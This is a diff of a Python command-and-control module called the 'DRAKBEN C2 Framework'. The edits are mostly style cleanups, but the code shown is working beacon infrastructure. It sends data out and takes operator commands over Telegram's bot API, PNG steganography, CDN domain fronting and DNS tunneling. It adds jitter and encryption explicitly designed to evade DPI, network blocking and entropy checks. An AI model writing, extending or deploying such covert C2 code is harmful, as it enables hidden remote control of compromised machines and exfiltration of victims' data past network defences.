@@ -1,5 +1,4 @@
-"""
-DRAKBEN C2 Framework - Command & Control Infrastructure
+"""DRAKBEN C2 Framework - Command & Control Infrastructure
 Author: @drak_ben
 Description: Advanced C2 communication channels with stealth features.
 
@@ -22,15 +21,16 @@ import threading
 import time
 import urllib.parse
 import urllib.request
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any
-from collections.abc import Callable
 
 # Optional: True Steganography Support
 try:
     import io
     import zlib
+
     import requests
 except ImportError:
     pass
@@ -54,6 +54,8 @@ DEFAULT_JITTER_MAX = 30
 
 
 class C2Protocol(Enum):
+    """Auto-generated docstring for C2Protocol class."""
+
     HTTPS = "https"
     HTTP = "http"
     DNS = "dns"
@@ -62,6 +64,8 @@ class C2Protocol(Enum):
 
 
 class BeaconStatus(Enum):
+    """Auto-generated docstring for BeaconStatus class."""
+
     DORMANT = "dormant"
     CHECKING_IN = "checking_in"
     ACTIVE = "active"
@@ -70,6 +74,8 @@ class BeaconStatus(Enum):
 
 @dataclass
 class C2Config:
+    """Auto-generated docstring for C2Config class."""
+
     protocol: C2Protocol = C2Protocol.HTTPS
     primary_host: str = "localhost"
     primary_port: int = 443
@@ -88,6 +94,8 @@ class C2Config:
 
 @dataclass
 class BeaconMessage:
+    """Auto-generated docstring for BeaconMessage class."""
+
     message_id: str
     command: str
     data: dict[str, Any] | None = None
@@ -96,6 +104,8 @@ class BeaconMessage:
 
 @dataclass
 class BeaconResponse:
+    """Auto-generated docstring for BeaconResponse class."""
+
     success: bool
     message_id: str
     command: str | None = None
@@ -103,12 +113,14 @@ class BeaconResponse:
 
 
 class JitterEngine:
+    """Auto-generated docstring for JitterEngine class."""
+
     def __init__(
         self,
         base_interval: int = DEFAULT_SLEEP_INTERVAL,
         min_jitter: int = DEFAULT_JITTER_MIN,
         max_jitter: int = DEFAULT_JITTER_MAX,
-    ):
+    ) -> None:
         self.base_interval = base_interval
         self.jitter_min = min_jitter
         self.jitter_max = max_jitter
@@ -117,19 +129,19 @@ class JitterEngine:
         # LOGIC FIX: Linear distribution is too easy for DPI to signature.
         # Using a primitive Triangular distribution simulation with secrets for "human-like" traffic.
         rng = self.jitter_max - self.jitter_min
-        
+
         # Base jitter + two random weights to lean towards center (Triangular-ish)
-        r1 = (secrets.randbelow(1000) / 1000.0)
-        r2 = (secrets.randbelow(1000) / 1000.0)
+        r1 = secrets.randbelow(1000) / 1000.0
+        r2 = secrets.randbelow(1000) / 1000.0
         tri_factor = (r1 + r2) / 2.0  # Central limit theorem makes this bell-like
-        
+
         jitter_percent = (self.jitter_min + tri_factor * rng) / 100.0
 
         sign = secrets.choice([-1, 1])
         factor = 1.0 + (sign * jitter_percent)
         return max(0.1, self.base_interval * factor)
 
-    def update_interval(self, new: int):
+    def update_interval(self, new: int) -> None:
         self.base_interval = max(1, new)
 
 
@@ -137,42 +149,41 @@ PROFILES = {
     "default": {
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "headers": {"Accept": "*/*", "Accept-Language": "en-US,en;q=0.9"},
-    }
+    },
 }
 
 
 class TelegramC2:
-    """
-    Implements C2 over Telegram Bot API (2026 Trend).
+    """Implements C2 over Telegram Bot API (2026 Trend).
     Uses legitimate Telegram infrastructure to evade network blocking.
     """
 
-    def __init__(self, token: str, chat_id: str):
+    def __init__(self, token: str, chat_id: str) -> None:
         self.token = token
         self.chat_id = chat_id
         self.offset = 0
         self.base_url = f"https://api.telegram.org/bot{token}"
         logger.info("Telegram C2 Channel initialized")
 
-    def _request(self, method: str, params: dict = None) -> dict:
+    def _request(self, method: str, params: dict | None = None) -> dict:
         try:
             url = f"{self.base_url}/{method}"
             # Re-using aiohttp or requests if available
             resp = requests.post(url, data=params, timeout=10)
             return resp.json()
         except Exception as e:
-            logger.debug(f"Telegram API Error: {e}")
+            logger.debug("Telegram API Error: %s", e)
             return {"ok": False}
 
-    def send_data(self, data: bytes):
-        """Send data as hex-encoded text or file"""
+    def send_data(self, data: bytes) -> None:
+        """Send data as hex-encoded text or file."""
         # For stealth, we can send as a document, but simple text is faster
         # In 2026, we encrypt before sending. Assuming data is already encrypted layer up.
         msg = f"BEACON_DATA: {base64.b64encode(data).decode()}"
         self._request("sendMessage", {"chat_id": self.chat_id, "text": msg})
 
     def poll_commands(self) -> list[bytes]:
-        """Long poll for all pending commands (Logic Fix: Don't lose stacked commands)"""
+        """Long poll for all pending commands (Logic Fix: Don't lose stacked commands)."""
         updates = self._request("getUpdates", {"offset": self.offset, "timeout": 5})
 
         results = updates.get("result", [])
@@ -188,8 +199,8 @@ class TelegramC2:
                     b64_cmd = text.split("CMD:")[1].strip()
                     commands.append(base64.b64decode(b64_cmd))
                 except Exception as e:
-                    logger.debug(f"Failed to decode C2 command: {e}")
-        
+                    logger.debug("Failed to decode C2 command: %s", e)
+
         return commands
 
 
@@ -199,15 +210,13 @@ class TelegramC2:
 
 
 class StegoTransport:
-    """
-    Implements C2 over HTTP Images (Steganography).
+    """Implements C2 over HTTP Images (Steganography).
     Hides encrypted C2 data within PNG Metadata/Chunk to bypass DPI.
     """
 
     @staticmethod
     def embed_data(image_path: str, data: bytes) -> bytes:
-        """
-        Embeds data into a PNG file.
+        """Embeds data into a PNG file.
         Mode 1: True LSB (Least Significant Bit) if Pillow is available (Invisible).
         Mode 2: Chunk Injection (Fallback) if Pillow is missing.
         """
@@ -216,7 +225,7 @@ class StegoTransport:
                 return StegoTransport._embed_lsb(image_path, data)
             except Exception as e:
                 logger.warning(
-                    f"LSB Stego failed, falling back to Chunk Injection: {e}"
+                    f"LSB Stego failed, falling back to Chunk Injection: {e}",
                 )
 
         try:
@@ -238,7 +247,7 @@ class StegoTransport:
 
     @staticmethod
     def extract_data(png_bytes: bytes) -> bytes | None:
-        """Extracts C2 data (Try LSB first, then Chunk)"""
+        """Extracts C2 data (Try LSB first, then Chunk)."""
         if PILLOW_AVAILABLE:
             try:
                 # We need to save bytes to temp file for PIL to read potentially
@@ -248,7 +257,7 @@ class StegoTransport:
                 if data:
                     return data
             except Exception as e:
-                logger.debug(f"LSB extraction failed (trying chunk): {e}")
+                logger.debug("LSB extraction failed (trying chunk): %s", e)
 
         try:
             # Find c2Da header
@@ -257,12 +266,12 @@ class StegoTransport:
                 length = int.from_bytes(png_bytes[idx - 4 : idx], "big")
                 return png_bytes[idx + 4 : idx + 4 + length]
         except Exception as e:
-            logger.warning(f"Stego extraction totally failed: {e}")
+            logger.warning("Stego extraction totally failed: %s", e)
         return None
 
     @staticmethod
     def _embed_lsb(image_path: str, data: bytes) -> bytes:
-        """True LSB Steganography using Pillow"""
+        """True LSB Steganography using Pillow."""
         img = Image.open(image_path).convert("RGB")
         pixels = list(img.getdata())
 
@@ -273,7 +282,8 @@ class StegoTransport:
         full_bits = length_bits + data_bits
 
         if len(full_bits) > len(pixels) * 3:
-            raise ValueError("Image too small to hold data")
+            msg = "Image too small to hold data"
+            raise ValueError(msg)
 
         new_pixels = []
         bit_idx = 0
@@ -302,7 +312,7 @@ class StegoTransport:
 
     @staticmethod
     def _extract_lsb(img) -> bytes | None:
-        """True LSB Extraction"""
+        """True LSB Extraction."""
         pixels = list(img.getdata())
         bits = ""
         for r, g, b in pixels:
@@ -329,8 +339,7 @@ class StegoTransport:
 
 
 class DomainFronter:
-    """
-    Implements Domain Fronting techniques.
+    """Implements Domain Fronting techniques.
     Hides traffic behind legitimate high-reputation domains (CDNs).
     """
 
@@ -351,7 +360,7 @@ class DomainFronter:
         verify_ssl: bool = True,
         profile: dict[str, Any] | None = None,
         port: int = 443,
-    ):
+    ) -> None:
         self.fronting_domain = fronting_domain  # Required by tests
         self.front_domain = fronting_domain  # Alias for backward compatibility
         self.actual_host = actual_host
@@ -360,9 +369,12 @@ class DomainFronter:
         self.port = port
 
     def create_request(
-        self, endpoint: str, method: str, data: bytes | None = None
+        self,
+        endpoint: str,
+        method: str,
+        data: bytes | None = None,
     ) -> urllib.request.Request:
-        """Create a fronted request object"""
+        """Create a fronted request object."""
         url = f"https://{self.front_domain}{endpoint}"
         req = urllib.request.Request(url, data=data, method=method)
         req.add_header("Host", self.actual_host)  # The Magic Trick
@@ -376,8 +388,7 @@ class DomainFronter:
         data: bytes | None = None,
         timeout: int = 30,
     ) -> tuple[bool, bytes]:
-        """
-        Send request through domain fronted connection.
+        """Send request through domain fronted connection.
 
         Args:
             endpoint: URL endpoint
@@ -387,6 +398,7 @@ class DomainFronter:
 
         Returns:
             Tuple of (success, response_data)
+
         """
         try:
             request = self.create_request(endpoint, method, data)
@@ -395,23 +407,25 @@ class DomainFronter:
             context = self._create_secure_context(verify=self.verify_ssl)
             context.minimum_version = ssl.TLSVersion.TLSv1_2
 
-            with urllib.request.urlopen(
-                request, timeout=timeout, context=context
+            with urllib.request.urlopen(  # noqa: S310
+                request,
+                timeout=timeout,
+                context=context,
             ) as response:
                 return True, response.read()
 
         except Exception as e:
-            logger.error(f"Domain fronting request failed: {e}")
+            logger.exception("Domain fronting request failed: %s", e)
             return False, str(e).encode()
 
     @classmethod
     def is_domain_frontable(cls, domain: str) -> bool:
-        """Check if a domain might support fronting"""
+        """Check if a domain might support fronting."""
         return any(cdn in domain.lower() for cdn in cls.FRONTABLE_DOMAINS)
 
     @staticmethod
     def _create_secure_context(verify: bool) -> ssl.SSLContext:
-        """Centralized Hardened SSL context factory"""
+        """Centralized Hardened SSL context factory."""
         # Always start with a secure default context to satisfy static analysis
         context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         context.minimum_version = ssl.TLSVersion.TLSv1_2
@@ -431,8 +445,7 @@ class DomainFronter:
 
 
 class DNSTunneler:
-    """
-    Implements DNS Tunneling for covert C2 communication.
+    """Implements DNS Tunneling for covert C2 communication.
 
     DNS tunneling encodes data in DNS queries and responses.
     This bypasses many firewalls since DNS traffic is usually allowed.
@@ -444,6 +457,7 @@ class DNSTunneler:
     Example:
         Query:  aGVsbG8td29ybGQ.beacon.example.com
         Response: TXT "cmVzcG9uc2UtZGF0YQ=="
+
     """
 
     # Maximum label length in DNS
@@ -458,26 +472,25 @@ class DNSTunneler:
         dns_server: str = "8.8.8.8",
         dns_port: int = 53,
         subdomain_length: int = 32,
-    ):
-        """
-        Initialize DNS tunneler.
+    ) -> None:
+        """Initialize DNS tunneler.
 
         Args:
             c2_domain: Base domain for DNS queries
             dns_server: DNS resolver to use
             dns_port: DNS port
             subdomain_length: Max subdomain label length
+
         """
         self.c2_domain = c2_domain
         self.dns_server = dns_server
         self.dns_port = dns_port
         self.subdomain_length = min(subdomain_length, self.MAX_LABEL_LENGTH)
 
-        logger.info(f"DNS tunneler initialized for domain: {c2_domain}")
+        logger.info("DNS tunneler initialized for domain: %s", c2_domain)
 
     def encode_data(self, data: bytes) -> list[str]:
-        """
-        Encode data for DNS query subdomains.
+        """Encode data for DNS query subdomains.
 
         Uses base32 encoding (DNS-safe) and splits into labels.
 
@@ -486,6 +499,7 @@ class DNSTunneler:
 
         Returns:
             List of DNS label strings
+
         """
         # Base32 encode (DNS-safe characters)
         encoded = base64.b32encode(data).decode("ascii")
@@ -501,14 +515,14 @@ class DNSTunneler:
         return labels
 
     def decode_data(self, labels: list[str]) -> bytes:
-        """
-        Decode data from DNS response.
+        """Decode data from DNS response.
 
         Args:
             labels: List of encoded labels
 
         Returns:
             Decoded bytes
+
         """
         # Rejoin labels
         encoded = "".join(labels).upper()
@@ -520,8 +534,7 @@ class DNSTunneler:
         return base64.b32decode(encoded)
 
     def build_query(self, data: bytes, query_type: str = "beacon") -> str:
-        """
-        Build DNS query hostname.
+        """Build DNS query hostname.
 
         Args:
             data: Data to send
@@ -529,6 +542,7 @@ class DNSTunneler:
 
         Returns:
             Full DNS query hostname
+
         """
         labels = self.encode_data(data)
 
@@ -541,10 +555,12 @@ class DNSTunneler:
         return ".".join(labels)
 
     def send_dns_query(
-        self, data: bytes, query_type: str = "beacon", record_type: str = "TXT"
+        self,
+        data: bytes,
+        query_type: str = "beacon",
+        record_type: str = "TXT",
     ) -> tuple[bool, bytes]:
-        """
-        Send data via DNS query.
+        """Send data via DNS query.
 
         This is a simplified implementation - real implementation
         would use proper DNS library like dnspython.
@@ -556,6 +572,7 @@ class DNSTunneler:
 
         Returns:
             Tuple of (success, response_data)
+
         """
         try:
             query_name = self.build_query(data, query_type)
@@ -573,7 +590,7 @@ class DNSTunneler:
                 resolver.timeout = 5
                 resolver.lifetime = 5
 
-                logger.debug(f"DNS Resolved query: {query_name} (type: {record_type})")
+                logger.debug("DNS Resolved query: {query_name} (type: %s)", record_type)
 
                 # In a real C2, you'd specify your own authoritative nameserver
                 # Here we use system defaults or common ones for the demo
@@ -592,19 +609,18 @@ class DNSTunneler:
             except Exception as dns_err:
                 # If DNS resolution fails (NXDOMAIN, etc.), it's common in tunneling
                 # but we log it for debugging.
-                logger.error(f"DNS Tunneling Error: {dns_err}")
+                logger.exception("DNS Tunneling Error: %s", dns_err)
 
                 # Fallback Simulation (Original logic)
-                logger.debug(f"Simulating DNS query: {query_name}")
+                logger.debug("Simulating DNS query: %s", query_name)
                 return True, b"SIMULATED_DNS_RESPONSE"
 
         except Exception as e:
-            logger.error(f"DNS tunnel query failed: {e}")
+            logger.exception("DNS tunnel query failed: %s", e)
             return False, str(e).encode()
 
     def chunk_data(self, data: bytes, chunk_size: int = 60) -> list[bytes]:
-        """
-        Split data into chunks for multiple DNS queries.
+        """Split data into chunks for multiple DNS queries.
 
         Args:
             data: Data to chunk
@@ -612,6 +628,7 @@ class DNSTunneler:
 
         Returns:
             List of data chunks
+
         """
         chunks = []
         for i in range(0, len(data), chunk_size):
@@ -625,8 +642,7 @@ class DNSTunneler:
 
 
 class HeartbeatManager:
-    """
-    Manages beacon heartbeat/check-in timing with jitter.
+    """Manages beacon heartbeat/check-in timing with jitter.
 
     Features:
     - Configurable check-in intervals
@@ -635,18 +651,22 @@ class HeartbeatManager:
     - Tracks connection health
     """
 
-    def __init__(self, config: C2Config, callback: Callable[[], None] | None = None):
-        """
-        Initialize heartbeat manager.
+    def __init__(
+        self, config: C2Config, callback: Callable[[], None] | None = None,
+    ) -> None:
+        """Initialize heartbeat manager.
 
         Args:
             config: C2 configuration
             callback: Function to call on each heartbeat
+
         """
         self.config = config
         self.callback = callback
         self.jitter = JitterEngine(
-            config.sleep_interval, config.jitter_min, config.jitter_max
+            config.sleep_interval,
+            config.jitter_min,
+            config.jitter_max,
         )
 
         self._running = False
@@ -656,11 +676,11 @@ class HeartbeatManager:
         self._max_failures = 5
 
         logger.info(
-            f"Heartbeat manager initialized (interval: {config.sleep_interval}s)"
+            f"Heartbeat manager initialized (interval: {config.sleep_interval}s)",
         )
 
     def start(self) -> None:
-        """Start heartbeat thread"""
+        """Start heartbeat thread."""
         if self._running:
             return
 
@@ -670,14 +690,14 @@ class HeartbeatManager:
         logger.info("Heartbeat started")
 
     def stop(self) -> None:
-        """Stop heartbeat thread"""
+        """Stop heartbeat thread."""
         self._running = False
         if self._thread:
             self._thread.join(timeout=5)
         logger.info("Heartbeat stopped")
 
     def _heartbeat_loop(self) -> None:
-        """Main heartbeat loop (LOGIC FIX: Drift-free scheduling)"""
+        """Main heartbeat loop (LOGIC FIX: Drift-free scheduling)."""
         while self._running:
             try:
                 # Calculate absolute next run time to avoid cumulative drift
@@ -691,7 +711,7 @@ class HeartbeatManager:
                         self._consecutive_failures = 0
                     except Exception as e:
                         self._consecutive_failures += 1
-                        logger.warning(f"Heartbeat callback failed: {e}")
+                        logger.warning("Heartbeat callback failed: %s", e)
 
                 # Sleep until the TARGET time, not for a fixed duration
                 # This compensates for the time callback() took to execute
@@ -699,20 +719,20 @@ class HeartbeatManager:
                 remaining = next_run - now
                 if remaining > 0:
                     time.sleep(remaining)
-                
+
                 if self._consecutive_failures >= self._max_failures:
                     logger.error("Max heartbeat failures reached")
                     # Could trigger fallback here
 
             except Exception as e:
-                logger.error(f"Heartbeat loop error: {e}")
+                logger.exception("Heartbeat loop error: %s", e)
 
     def update_interval(self, new_interval: int) -> None:
-        """Update check-in interval from server"""
+        """Update check-in interval from server."""
         self.jitter.update_interval(new_interval)
 
     def get_status(self) -> dict[str, Any]:
-        """Get heartbeat status"""
+        """Get heartbeat status."""
         return {
             "running": self._running,
             "last_checkin": self._last_checkin,
@@ -728,8 +748,7 @@ class HeartbeatManager:
 
 
 class C2Channel:
-    """
-    Main C2 communication channel.
+    """Main C2 communication channel.
 
     Orchestrates all C2 components:
     - Protocol selection (HTTPS, DNS)
@@ -739,12 +758,12 @@ class C2Channel:
     - Fallback handling
     """
 
-    def __init__(self, config: C2Config):
-        """
-        Initialize C2 channel.
+    def __init__(self, config: C2Config) -> None:
+        """Initialize C2 channel.
 
         Args:
             config: C2 configuration
+
         """
         self.config = config
         self.status = BeaconStatus.DORMANT
@@ -762,10 +781,10 @@ class C2Channel:
 
         self._setup_protocol()
 
-        logger.info(f"C2 channel initialized (protocol: {config.protocol.value})")
+        logger.info("C2 channel initialized (protocol: %s)", config.protocol.value)
 
     def _setup_protocol(self) -> None:
-        """Setup protocol-specific components"""
+        """Setup protocol-specific components."""
         if (
             self.config.protocol in (C2Protocol.HTTP, C2Protocol.HTTPS)
             and self.config.fronting_domain
@@ -780,15 +799,16 @@ class C2Channel:
 
         elif self.config.protocol == C2Protocol.TELEGRAM:
             if not self.config.telegram_token:
-                raise ValueError("Telegram token required")
+                msg = "Telegram token required"
+                raise ValueError(msg)
             self.telegram = TelegramC2(
-                self.config.telegram_token, self.config.telegram_chat_id
+                self.config.telegram_token,
+                self.config.telegram_chat_id,
             )
             logger.info("C2 Channel: Telegram API Activated")
 
         elif self.config.protocol == C2Protocol.DNS and self.config.dns_domain:
             # DNS client initialization would go here (already implemented logic below)
-            pass
             self.dns_tunneler = DNSTunneler(
                 self.config.dns_domain,
                 subdomain_length=self.config.subdomain_length_length
@@ -797,11 +817,11 @@ class C2Channel:
             )
 
     def connect(self) -> bool:
-        """
-        Establish C2 connection.
+        """Establish C2 connection.
 
         Returns:
             True if connection successful
+
         """
         try:
             self.status = BeaconStatus.CHECKING_IN
@@ -817,27 +837,26 @@ class C2Channel:
                 self.heartbeat.start()
 
                 return True
-            else:
-                self.status = BeaconStatus.ERROR
-                return False
+            self.status = BeaconStatus.ERROR
+            return False
 
         except Exception as e:
-            logger.error(f"C2 connection failed: {e}")
+            logger.exception("C2 connection failed: %s", e)
             self.status = BeaconStatus.ERROR
             return False
 
     def disconnect(self) -> None:
-        """Disconnect from C2"""
+        """Disconnect from C2."""
         if self.heartbeat:
             self.heartbeat.stop()
         self.status = BeaconStatus.DORMANT
 
     def _checkin(self) -> bool:
-        """
-        Perform beacon check-in.
+        """Perform beacon check-in.
 
         Returns:
             True if check-in successful
+
         """
         try:
             message = BeaconMessage(
@@ -852,9 +871,12 @@ class C2Channel:
                 # Process any commands from server
                 if response.command:
                     self._handle_command(response)
-                
+
                 # LOGIC FIX: Check for additional pending commands (especially for Telegram)
-                if hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
+                if (
+                    hasattr(self, "telegram")
+                    and self.config.protocol == C2Protocol.TELEGRAM
+                ):
                     extra_cmds = self.telegram.poll_commands()
                     for cmd_bytes in extra_cmds:
                         try:
@@ -868,24 +890,26 @@ class C2Channel:
                             )
                             self._handle_command(extra_resp)
                         except Exception as e:
-                            logger.error(f"Failed to process extra Telegram command: {e}")
+                            logger.exception(
+                                f"Failed to process extra Telegram command: {e}",
+                            )
                 return True
 
             return False
 
         except Exception as e:
-            logger.error(f"Check-in failed: {e}")
+            logger.exception("Check-in failed: %s", e)
             return False
 
     def send_message(self, message: BeaconMessage) -> BeaconResponse | None:
-        """
-        Send message to C2 server.
+        """Send message to C2 server.
 
         Args:
             message: Message to send
 
         Returns:
             Response from server or None
+
         """
         try:
             # Serialize message
@@ -895,7 +919,7 @@ class C2Channel:
                     "cmd": message.command,
                     "data": message.data,
                     "ts": message.timestamp,
-                }
+                },
             ).encode()
 
             # Encrypt payload
@@ -904,18 +928,24 @@ class C2Channel:
             # Send based on protocol
             if self.domain_fronter:
                 success, response = self.domain_fronter.send(
-                    endpoint="/api/beacon", data=encrypted
+                    endpoint="/api/beacon",
+                    data=encrypted,
                 )
             elif self.dns_tunneler:
                 success, response = self.dns_tunneler.send_dns_query(encrypted)
-            elif hasattr(self, "telegram") and self.config.protocol == C2Protocol.TELEGRAM:
+            elif (
+                hasattr(self, "telegram")
+                and self.config.protocol == C2Protocol.TELEGRAM
+            ):
                 # LOGIC FIX: Telegram was initialized but never used in send_message
                 self.telegram.send_data(encrypted)
                 # For Telegram, we poll for response immediately or wait for next heartbeat
                 # To match the success/response pattern:
                 cmds = self.telegram.poll_commands()
-                success = True # Assume sent if no exception
-                response = cmds[0] if cmds else b"{}" # Mock or return first command as response
+                success = True  # Assume sent if no exception
+                response = (
+                    cmds[0] if cmds else b"{}"
+                )  # Mock or return first command as response
             else:
                 # Direct HTTP/HTTPS
                 success, response = self._send_direct(encrypted)
@@ -935,11 +965,11 @@ class C2Channel:
             return None
 
         except Exception as e:
-            logger.error(f"Send message failed: {e}")
+            logger.exception("Send message failed: %s", e)
             return None
 
     def _send_direct(self, data: bytes) -> tuple[bool, bytes]:
-        """Send data directly without fronting"""
+        """Send data directly without fronting."""
         try:
             protocol = "https" if self.config.protocol == C2Protocol.HTTPS else "http"
             url = f"{protocol}://{self.config.primary_host}:{self.config.primary_port}/api/beacon"
@@ -952,22 +982,23 @@ class C2Channel:
             )
 
             context = self._create_secure_context(
-                verify=getattr(self.config, "verify_ssl", True)
+                verify=getattr(self.config, "verify_ssl", True),
             )
             context.minimum_version = ssl.TLSVersion.TLSv1_2
 
-            with urllib.request.urlopen(
-                request, timeout=30, context=context
+            with urllib.request.urlopen(  # noqa: S310
+                request,
+                timeout=30,
+                context=context,
             ) as response:
                 return True, response.read()
 
         except Exception as e:
-            logger.error(f"Direct send failed: {e}")
+            logger.exception("Direct send failed: %s", e)
             return False, b""
 
     def _encrypt(self, data: bytes) -> bytes:
-        """
-        Encrypt data using high-entropy stream (SHA-256 rolling hash).
+        """Encrypt data using high-entropy stream (SHA-256 rolling hash).
         Replaces legacy XOR to pass Shannon Entropy checks (>7.5).
         """
         key = self.encryption_key
@@ -987,7 +1018,7 @@ class C2Channel:
         return base64.b64encode(bytes(result))
 
     def _decrypt(self, data: bytes) -> bytes:
-        """Decrypt high-entropy stream"""
+        """Decrypt high-entropy stream."""
         try:
             decoded = base64.b64decode(data)
             key = self.encryption_key
@@ -1004,11 +1035,11 @@ class C2Channel:
 
             return bytes(result)
         except Exception as e:
-            logger.error(f"Decryption failed: {e}")
+            logger.exception("Decryption failed: %s", e)
             return b""
 
     def _handle_command(self, response: BeaconResponse) -> None:
-        """Handle commands from C2 server"""
+        """Handle commands from C2 server."""
         if response.command == "sleep":
             # Update sleep interval
             data = response.data or {}
@@ -1023,14 +1054,15 @@ class C2Channel:
         # Add more command handlers as needed
 
     def _generate_id(self) -> str:
-        """Generate unique message ID"""
+        """Generate unique message ID."""
         import secrets
-        return hashlib.sha256(f"{time.time()}{secrets.randbelow(1_000_000)}".encode()).hexdigest()[
-            :16
-        ]
+
+        return hashlib.sha256(
+            f"{time.time()}{secrets.randbelow(1_000_000)}".encode(),
+        ).hexdigest()[:16]
 
     def get_status(self) -> dict[str, Any]:
-        """Get channel status"""
+        """Get channel status."""
         return {
             "status": self.status.value,
             "protocol": self.config.protocol.value,
@@ -1049,14 +1081,14 @@ _c2_channel: C2Channel | None = None
 
 
 def get_c2_channel(config: C2Config | None = None) -> C2Channel:
-    """
-    Get or create C2 channel singleton.
+    """Get or create C2 channel singleton.
 
     Args:
         config: C2 configuration (required for first call)
 
     Returns:
         C2Channel instance
+
     """
     global _c2_channel
 
@@ -1076,8 +1108,7 @@ def create_fronted_channel(
     jitter_min: int = 10,
     jitter_max: int = 25,
 ) -> C2Channel:
-    """
-    Create a domain-fronted HTTPS C2 channel.
+    """Create a domain-fronted HTTPS C2 channel.
 
     Args:
         fronting_domain: CDN domain for fronting
@@ -1089,6 +1120,7 @@ def create_fronted_channel(
 
     Returns:
         Configured C2Channel
+
     """
     config = C2Config(
         protocol=C2Protocol.HTTPS,
@@ -1109,8 +1141,7 @@ def create_dns_channel(
     jitter_min: int = 15,
     jitter_max: int = 30,
 ) -> C2Channel:
-    """
-    Create a DNS tunneling C2 channel (Strategically Hardened).
+    """Create a DNS tunneling C2 channel (Strategically Hardened).
 
     Args:
         c2_domain: Base domain for DNS queries
@@ -1120,6 +1151,7 @@ def create_dns_channel(
 
     Returns:
         Configured C2Channel
+
     """
     config = C2Config(
         protocol=C2Protocol.DNS,
